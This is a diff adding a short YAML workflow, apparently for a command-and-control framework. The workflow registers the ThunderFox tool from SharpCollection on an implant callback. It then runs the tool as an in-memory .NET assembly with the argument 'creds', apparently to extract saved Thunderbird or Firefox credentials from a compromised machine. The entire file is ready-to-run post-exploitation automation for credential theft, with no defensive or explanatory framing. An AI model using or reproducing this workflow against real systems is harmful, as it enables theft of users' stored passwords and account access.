@@ -1,0 +1,38 @@
+name: "forge_net_Thunderfox"
+description: "Register and run ThunderFox via forge_net"
+trigger: manual
+run_as: self
+
+steps:
+###########################################################
+# ThunderFox
+# https://github.com/V1V1/SharpScribbles
+###########################################################
+  - name: "register forge_net_ThunderFox"
+    depends_on: []
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_register
+      payload_type: forge
+      params_dictionary:
+        collectionName: SharpCollection
+        commandName: ThunderFox
+        remove: false
+
+  - name: "run forge_net_Thunderfox"
+    depends_on:
+    - "register forge_net_ThunderFox"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_ThunderFox
+      payload_type: forge
+      params_dictionary:
+        args: "creds"
+        version: 4.7_Any
+        execution: inline_assembly
